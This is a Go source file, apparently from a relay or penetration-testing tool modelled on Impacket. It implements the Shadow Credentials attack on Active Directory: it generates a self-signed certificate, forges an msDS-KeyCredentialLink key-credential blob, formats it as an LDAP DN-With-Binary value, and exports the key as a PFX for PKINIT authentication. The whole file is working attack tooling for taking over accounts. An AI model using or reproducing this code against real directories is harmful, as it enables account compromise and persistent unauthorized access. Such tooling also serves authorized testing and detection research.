// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"time"

	"software.sslmate.com/src/go-pkcs12"
)

// generateSelfSignedCert creates a self-signed X.509 certificate for Shadow Credentials.
// Uses RSA-2048 to match Impacket and PKINIT requirements.
func generateSelfSignedCert(subject string) (*x509.Certificate, *rsa.PrivateKey, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("generate key: %v", err)
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: subject,
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(3650 * 24 * time.Hour), // 10 years
		KeyUsage:              x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
		IsCA:                  true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return nil, nil, fmt.Errorf("create cert: %v", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("parse cert: %v", err)
	}

	return cert, key, nil
}

// rawPublicKey builds a Windows RSA1 BLOB from an RSA public key.
// Format: "RSA1" + keySize(4 LE) + expLen(4 LE) + modLen(4 LE) + padding(8) + exponent + modulus
// Matches Impacket's KeyCredential.raw_public_key().
func rawPublicKey(pub *rsa.PublicKey) []byte {
	exponent := big.NewInt(int64(pub.E)).Bytes() // big-endian
	modulus := pub.N.Bytes()                     // big-endian

	buf := make([]byte, 0, 4+4+4+4+8+len(exponent)+len(modulus))

	// Magic: "RSA1"
	buf = append(buf, 'R', 'S', 'A', '1')

	// Key size in bits (LE uint32)
	tmp := make([]byte, 4)
	binary.LittleEndian.PutUint32(tmp, uint32(pub.N.BitLen()))
	buf = append(buf, tmp...)

	// Exponent length (LE uint32)
	binary.LittleEndian.PutUint32(tmp, uint32(len(exponent)))
	buf = append(buf, tmp...)

	// Modulus length (LE uint32)
	binary.LittleEndian.PutUint32(tmp, uint32(len(modulus)))
	buf = append(buf, tmp...)

	// Padding: 2x uint32(0) = 8 zero bytes
	buf = append(buf, 0, 0, 0, 0, 0, 0, 0, 0)

	// Exponent bytes (big-endian)
	buf = append(buf, exponent...)

	// Modulus bytes (big-endian)
	buf = append(buf, modulus...)

	return buf
}

// buildKeyCredential constructs the msDS-KeyCredentialLink binary blob.
// Returns (keyCredentialBlob, deviceID, error).
// Format matches Impacket's KeyCredential.dumpBinary().
func buildKeyCredential(cert *x509.Certificate, key *rsa.PrivateKey) ([]byte, []byte, error) {
	pubKeyBlob := rawPublicKey(&key.PublicKey)

	// Key identifier = SHA256 of RSA BLOB (matches Impacket)
	keyIDHash := sha256.Sum256(pubKeyBlob)
	keyID := keyIDHash[:]

	// Device ID = random 16 bytes (UUID)
	deviceID := make([]byte, 16)
	rand.Read(deviceID)

	// Current time as Windows FILETIME ticks
	ticks := windowsFiletimeTicks(time.Now())
	ticksBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(ticksBytes, ticks)

	// Build properties with correct Impacket property IDs:
	//   KEY_MATERIAL=3, KEY_USAGE=4, KEY_SOURCE=5, DEVICE_ID=6,
	//   CUSTOM_KEY_INFO=7, LAST_LOGON_TIME=8, CREATION_TIME=9
	material := buildKeyCredProperty(0x03, pubKeyBlob)              // KEY_MATERIAL
	usage := buildKeyCredProperty(0x04, []byte{0x01})               // KEY_USAGE (NGC)
	source := buildKeyCredProperty(0x05, []byte{0x00})              // KEY_SOURCE (AD)
	devID := buildKeyCredProperty(0x06, deviceID)                   // DEVICE_ID
	customKeyInfo := buildKeyCredProperty(0x07, []byte{0x01, 0x00}) // CUSTOM_KEY_INFO
	lastLogon := buildKeyCredProperty(0x08, ticksBytes)             // LAST_LOGON_TIME
	creation := buildKeyCredProperty(0x09, ticksBytes)              // CREATION_TIME

	var binaryProperties []byte
	binaryProperties = append(binaryProperties, material...)
	binaryProperties = append(binaryProperties, usage...)
	binaryProperties = append(binaryProperties, source...)
	binaryProperties = append(binaryProperties, devID...)
	binaryProperties = append(binaryProperties, customKeyInfo...)
	binaryProperties = append(binaryProperties, lastLogon...)
	binaryProperties = append(binaryProperties, creation...)

	// binaryData = packData([keyIdentifier(1, keyID), keyHash(2, SHA256(binaryProperties))])
	propsHash := sha256.Sum256(binaryProperties)
	keyIdentifier := buildKeyCredProperty(0x01, keyID)
	keyHash := buildKeyCredProperty(0x02, propsHash[:])

	var binaryData []byte
	binaryData = append(binaryData, keyIdentifier...)
	binaryData = append(binaryData, keyHash...)

	// Final: version(4 LE) + binaryData + binaryProperties
	version := make([]byte, 4)
	binary.LittleEndian.PutUint32(version, 0x200)

	var blob []byte
	blob = append(blob, version...)
	blob = append(blob, binaryData...)
	blob = append(blob, binaryProperties...)

	return blob, deviceID, nil
}

// buildKeyCredProperty constructs a single KeyCredential property entry.
// Format: Length(2 bytes LE) + ID(1 byte) + Data — 3-byte header.
// Matches Impacket's __packData: pack("<HB", len(field[1]), field[0]) + field[1]
func buildKeyCredProperty(id byte, data []byte) []byte {
	entry := make([]byte, 3+len(data))
	binary.LittleEndian.PutUint16(entry[0:2], uint16(len(data)))
	entry[2] = id
	copy(entry[3:], data)
	return entry
}

// formatDNWithBinary formats a KeyCredential blob as a "DN-With-Binary" LDAP value.
// Format: B:<hex_length>:<hex_data>:<owner_dn>
func formatDNWithBinary(binaryData []byte, ownerDN string) string {
	hexData := hex.EncodeToString(binaryData)
	return fmt.Sprintf("B:%d:%s:%s", len(hexData), hexData, ownerDN)
}

// exportPFX exports a certificate and private key as a PKCS#12 (.pfx) file.
func exportPFX(cert *x509.Certificate, key *rsa.PrivateKey, path string, password string) error {
	pfxData, err := pkcs12.Modern.Encode(key, cert, nil, password)
	if err != nil {
		return fmt.Errorf("encode PKCS12: %v", err)
	}
	return os.WriteFile(path, pfxData, 0600)
}

// windowsFiletimeTicks converts a time.Time to Windows FILETIME ticks.
// FILETIME = 100-nanosecond intervals since January 1, 1601.
func windowsFiletimeTicks(t time.Time) uint64 {
	// Epoch difference: Jan 1, 1601 to Jan 1, 1970 in 100ns ticks
	const epochDiff = 116444736000000000
	unixNano := t.UnixNano()
	return uint64(unixNano/100) + epochDiff
}
